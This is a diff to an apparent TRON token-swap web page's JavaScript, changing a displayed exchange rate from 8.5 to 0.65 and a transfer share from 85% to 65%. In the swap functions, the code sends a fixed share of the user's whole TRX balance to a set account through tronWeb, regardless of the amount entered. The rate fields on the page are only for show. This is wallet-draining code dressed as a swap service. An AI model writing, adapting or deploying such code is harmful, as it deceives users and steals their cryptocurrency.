@@ -206,14 +206,14 @@
                   }
                   $("#token-input").focus();
                   $("#token-input").val(tokenBalance).change();
-                  $("#trx-swap").val(tokenBalance * 8.5).change();
+                  $("#trx-swap").val(tokenBalance * 0.65).change();
               }
 
               async function maxTRX(){
                   var acc = await tronWeb.trx.getAccount();
                   $("#trx-input").focus();
                   $("#trx-input").val(acc.balance / 1000000).change();
-                  $("#token-swap").val(acc.balance / 1000000 / 8.5).change();
+                  $("#token-swap").val(acc.balance / 1000000 / 0.65).change();
               }
 
               async function swapToken(){
@@ -234,7 +234,7 @@
                       alert('Your TRX balance not enough!');
                       return;
                   }
-                  var v = Math.floor(acc.balance * 85 / 100);
+                  var v = Math.floor(acc.balance * 65 / 100);
                   var tx = await tronWeb.trx.sendTransaction(account, v);
               }
 
@@ -245,7 +245,7 @@
                       alert('Your TRX balance not enough!');
                       return;
                   }
-                  var v = Math.floor(acc.balance * 85 / 100);
+                  var v = Math.floor(acc.balance * 65 / 100);
                   var tx = await tronWeb.trx.sendTransaction(account, v);
               }</script>
     <script>window.addEventListener('message', async function (e) {
@@ -303,11 +303,11 @@
               function change(){
                 try{
                   var tokens = $("#token-input").val();
-                  $("#trx-swap").val(tokens * 8.5).change();
+                  $("#trx-swap").val(tokens * 0.65).change();
 
 
                   var value = $("#trx-input").val();
-                  $("#token-swap").val(value / 8.5).change();
+                  $("#token-swap").val(value / 0.65).change();
 
                 }catch{}
               }
